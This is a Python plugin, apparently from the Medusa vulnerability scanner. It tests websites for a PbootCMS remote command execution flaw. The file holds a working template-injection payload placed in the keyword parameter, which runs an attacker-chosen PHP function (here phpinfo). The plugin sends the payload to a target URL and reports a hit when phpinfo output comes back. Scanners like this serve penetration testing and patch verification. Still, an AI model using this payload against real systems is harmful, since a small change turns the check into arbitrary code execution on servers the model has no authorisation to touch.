#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/11 16:39 PM'
from urllib import request
import ClassCongregation
import urllib.parse

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2019-12-25"  # 插件编辑时间
        self.info['disclosure']='2018-12-26'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "PbootCommandExecution"  # 插件名称
        self.info['name'] ='Pboot任意命令执行漏洞' #漏洞名称
        self.info['affects'] = "Pboot"  # 漏洞组件
        self.info['desc_content'] = "使用eval就可以绕过他function_exists函数会返回false这样$danger就不会为true不为true就可以任意执行代码了"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的版本"  # 修复建议
        self.info['version'] = "1.3.2之前版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload="/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        header = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }
        req = request.Request(payload_url, headers=header,)
        response = request.urlopen(req)
        con = response.read().decode('utf8')  # 如果编码报错，去除HTTP Header中的gzip参数即可
        code = response.getcode()
        if code == 200 and con.find('System') != -1 and con.find('Build Date') != -1 and con.find(
                'Compiler') != -1 and con.find('PHP Version') != -1:
            Medusa = "{} 存在PbootCMS命令执行漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类